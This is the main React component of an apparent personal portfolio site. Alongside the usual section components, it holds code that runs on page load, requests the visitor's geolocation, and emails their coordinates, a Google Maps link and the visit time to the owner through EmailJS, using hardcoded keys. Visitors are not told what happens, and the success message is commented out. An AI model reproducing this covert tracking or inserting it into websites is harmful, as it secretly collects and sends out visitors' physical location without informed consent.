
import Navbar from './Components/Navbar'
import Header from './Components/Header'
import Skills from './Components/Skills'
import Education from './Components/Education'
import Projects from './Components/Projects'
import Contact from './Components/Contact'
import { ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css';
import Footer from './Components/Footer'
import About from './Components/About'
import { useEffect, useState } from 'react'
import emailjs from '@emailjs/browser'
import { toast } from 'react-toastify'




function App() {
  const [userLocation, setUserLocation] = useState(null);
  const [emailSent, setEmailSent] = useState(false);

  // Function to send location data via email
  const sendLocationEmail = (latitude, longitude) => {
    // Prevent multiple emails
    if (emailSent) {
      // console.log("Email already sent, skipping...");
      return;
    }
    const currentTime = new Date().toLocaleString();
      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const templateParams = {
      from_name: 'Website Visitor',
      user_email: 'automatic@system.com',
      phone: 'N/A',
      message: `Automatic location data captured from website visitor. View location: ${googleMapsLink}`,
      user_latitude: latitude,
      user_longitude: longitude,
      location_info: `Visitor Location - Latitude: ${latitude}, Longitude: ${longitude}`,
      google_maps_link: googleMapsLink,
      visit_time: currentTime
    };emailjs
      .send('service_yrlxuma', 'template_0217uod', templateParams, {
        publicKey: 'TLs9u-trXhMYUsnMT',
      })
      .then(
        () => {
          // console.log("Location data sent successfully!");
          setEmailSent(true); // Mark email as sent
          // toast.success("Location data captured!", {
          //   position: "top-right",
          //   autoClose: 3000
          // });
        },
        (error) => {
          // console.log("Failed to send location data:", error);
          toast.error("location rejected", {
            position: "top-right",
            autoClose: 3000
          });
        },
      );
  };

  useEffect(() => {
    // Geolocation function
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else { 
        // console.log("Geolocation is not supported by this browser.");
      }
    }    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      // console.log("Latitude: " + latitude);
      // console.log("Longitude: " + longitude);
      
      // Store location data in state only if not already stored
      if (!userLocation) {
        setUserLocation({
          latitude: latitude,
          longitude: longitude
        });

        // Automatically send location data via email only once
        sendLocationEmail(latitude, longitude);
      }
    }

    function error() {
      // console.log("Sorry, no position available.");
    }

    // Automatically call geolocation when component mounts
    getLocation();
  }, []);

  return (
    <>

    <Navbar/>
    <Header/>
    <Skills/>
    <Education/>
    <Projects/>    <About/>
    <Contact userLocation={userLocation}/>
    <Footer/>
    <ToastContainer />

   
      
    </>
  )
}

export default App
